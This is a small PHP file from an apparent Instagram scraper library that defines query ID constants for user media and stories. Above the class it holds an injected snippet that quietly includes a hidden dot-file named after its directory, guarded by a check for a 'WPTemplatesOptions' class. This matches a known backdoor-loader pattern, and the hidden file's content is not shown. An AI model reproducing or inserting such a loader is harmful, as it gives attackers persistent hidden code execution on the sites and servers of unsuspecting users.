<?php

namespace InstagramScraper;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class InstagramQueryId
{
    /**
     * id = {{accoundId}}, first = {{count}}, after = {{mediaId}}
     */
    const USER_MEDIAS = '17880160963012870';
    const USER_STORIES = '17890626976041463';
    const STORIES = '17873473675158481';

}